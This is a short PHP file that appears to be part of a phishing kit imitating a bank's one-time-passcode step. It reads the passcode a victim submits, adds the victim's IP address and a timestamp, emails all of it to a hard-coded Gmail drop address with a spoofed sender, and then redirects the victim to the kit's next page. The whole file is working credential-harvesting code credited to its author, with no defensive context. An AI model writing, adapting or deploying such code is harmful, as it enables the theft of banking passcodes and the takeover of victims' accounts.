<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$token = $_POST['passwd'];
$fiftyme="zate123man@gmail.com";


  $subj = "CiBCfciB $ip";
  $msg = "OTP\n\nOTP: $token\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="Email.html"
</script>
